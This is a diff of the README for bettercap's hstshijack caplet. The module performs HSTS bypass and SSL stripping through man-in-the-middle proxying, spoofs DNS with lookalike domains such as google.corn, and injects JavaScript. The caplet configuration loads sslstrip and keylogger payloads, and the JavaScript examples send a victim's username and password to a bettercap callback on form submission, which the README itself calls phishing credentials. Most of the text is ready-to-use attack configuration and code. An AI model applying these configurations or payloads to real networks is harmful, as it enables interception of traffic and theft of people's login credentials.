@@ -5,99 +5,124 @@
 ### Caplet
 
 ```sh
-set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
-set hstshijack.ignore          *
-set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
-set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
-#set hstshijack.blockscripts    facebook.com,*.facebook.com
-set hstshijack.obfuscate       false
-set hstshijack.encode          true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
+
+# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
+# variables get precendence over those assigned to the 'hstshijack.ignore' variable.
+set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
+set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
+set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
+set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
+#set hstshijack.blockscripts    example.com,*.example.com
+set hstshijack.obfuscate       true
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+#set hstshijack.ignore          *
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq
+http.proxy on
 
-http.proxy  on
-dns.spoof   on
+set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
+set dns.spoof.all      true
+dns.spoof on
 ```
 
 ### Core payload
 
-This module injects HTML & JS files with a payload that spoofs your targeted hostnames and communicates with bettercap, revealing all URLs that were discovered in the injected document.
+This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>). This payload acts as a callback for bettercap, and takes care of hostname spoofing in the injected context (and document).
 
-When bettercap receives a callback with a new URL, it sends a HEAD request to learn whether the host in this URL sends HTTPS redirects, and keeps a log.
+### Scalable domain indexing (SSL log)
 
-This is done so that bettercap can know whether it should MITM an SSL connection with a host, before the victim navigates to it.
+If a host responds with an HTTPS redirect, bettercap will save this host in a list, and keep a log of (alphanumerically) ordered index ranges of the domains in this list, allowing it to scale by reducing a considerable amount of overhead for the proxy module.
 
-### Inject payloads
+Bettercap will try to spoof SSL connections between the client and said hosts, and will also send a HEAD request to each host that was discovered in an injected document, which we retrieve via callbacks from the hstshijack.js payload.
 
-You can also inject your own JavaScript payloads into HTML & JS files from specific hosts by assigning them to the `hstshijack.payloads` variable.
+By default, this caplet will remap the index ranges of all domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.check` variable value to `false`.
+
+Hostnames that you target with the `hstshijack.targets` variable are automatically logged and indexed.
+
+### Hostname spoofing
+
+In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_
+
+For every targeted hostname you must specify a replacement hostname, like this:
+
+```sh
+set hstshijack.targets       google.com, *.google.com
+set hstshijack.replacements  google.corn,*.google.corn
+```
+
+You can try to make them as unnoticeable as you can, but your options are limited here in terms of evading HSTS.
+
+### Block scripts
+
+In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript from hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 
+
+### Custom payloads
+
+You can also inject your own scripts into files from your specified hosts by assigning them to the `hstshijack.payloads` variable.
+
+Custom payloads are assembled at launch, and wrapped inside a function which is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once on every document, even if injected multiple times. Individual payloads are not failsafe, so you must set your conditions/try and catch blocks yourself.
 
 Example:
 
 ```sh
-hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 ```
 
-Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
-
-<a href="./payloads/sslstrip.js">**sslstrip.js**</a> is included, which strips the `s` from all `https` instances in `<a>`, `<form>`, `<iframe>` and `<script>` elements.
+You should always inject the hstshijack.js and sslstrip.js payloads when spoofing hostnames.
 
 ### Obfuscation
 
-By setting `hstshijack.obfuscate` to `true`, any instance in your payloads beginning with `obf_` will be obfuscated automatically. It's good practice to include unique prefixes/suffixes so that your variable names do not match those in other payloads.
+You can write custom payloads that are automatically obfuscated by the module.
 
-Example:
+Basically, every word that was found beginning with `obf_` will be obfuscated.
+
+Example: 
 
 ```js
-function obf_function_mySuffix() {
+function obf_function() {
   alert("Random variable: obf_whatever_follows")
 }
 
-obf_function_mySuffix()
+obf_function()
 ```
 
 Will be injected as:
 
 ```js
 function jfIleNwmKoa() {
-  alert("Random variable: AsjZnJW")
+  alert("Random variable: AsjZnJWklwMNqshCaloE")
 }
 
 jfIleNwmKoa()
 ```
 
-### Encoding
-
-Payloads can be injected in HTML documents using base64 encoded data URLs.
-
-To enable payload encoding, set `hstshijack.encode` to `true`.
-
 ### Silent callbacks
 
-You can write custom payloads that send data to bettercap without alerting the host.
+You can have your payloads send callbacks to your machine that bettercap will print, but not proxy.
 
 Example of a silent callback:
 
 ```js
 form.onsubmit = function() {
   req = new XMLHttpRequest()
-  req.open("POST", "http://" + location.host + "/obf_path_callback?email=" + email + "&password=" + password)
+  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
   req.send()
 }
 ```
-<sup>Note: Every instance of `obf_path_callback` will be replaced with the callback path, every instance of `obf_path_whitelist` will be replaced with the whitelist path, and every instance of `obf_path_ssl_log` will be replaced with the SSL log path.</sup>
 
-The code above will send a POST request that will be sniffed by bettercap, but not proxied. 
+The following POST request will be sniffed by bettercap, but not proxied (the request will be dropped). 
+
+Any instance of `obf_path_callback` will be replaced with the callback path that bettercap listens for (this can save time when writing JavaScript payloads).
 
 ### Whitelisting callbacks
 
-You can stop attacking a client on a certain host when you receive a request from that client for the whitelist path. The whitelist path will be inserted wherever you have `obf_path_whitelist` written in your payloads.
+You can automatically terminate an attack between specific clients and hosts by making the client's machine initiate a whitelisting callback.
 
-Example of whitelisting callbacks:
+Example of multiple whitelisting callbacks:
 
 ```js
-// Whitelist multiple domains
+// Whitelist multiple hosts to ensure the intended resources will load.
 
 form.onsubmit = function() {
   // Whitelist current hostname and phish credentials
@@ -122,29 +147,7 @@ form.onsubmit = function() {
 }
 ```
 
-When the bettercap proxy receives such a request, it will stop attacking clients on the requested (original and spoofed) host(s). If a spoofed location is requested that was whitelisted, the client will then be redirected to the intended location.
+When a request is sent as above, bettercap will stop spoofing connections between the sender and the requested host.
 
-Note that if the hostnames you are whitelisting are HSTS preloaded, you have to send the whitelist callback to the spoofed hostnames, otherwise the browser will enforce a HTTPS connection, and bettercap will not be able to intercept the requests.
+If any resource from a spoofed host is requested that was previously whitelisted for that client, then that client will be redirected to the intended (unspoofed) host.
 
-### Block scripts
-
-In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript on hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 
-
-### SSL log
-
-If a host responds with a HTTPS redirect, the module saves this host in the SSL log, and bettercap will from then on spoof SSL connections with this host when possible.
-
-### Hostname spoofing
-
-In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_
-
-For every hostname you assign to `hstshijack.targets` you must assign a replacement domain to the `hstshijack.replacements` variable.
-
-Example:
-
-```sh
-set hstshijack.targets       www.*, *.com, blockchain.info,*.blockchain.info
-set hstshijack.replacements  wvvw.*,*.corn,blockchian.info,*.blockchian.info
-```
-
-You can try to make them as unnoticeable or obvious as you like, but your options are limited here.
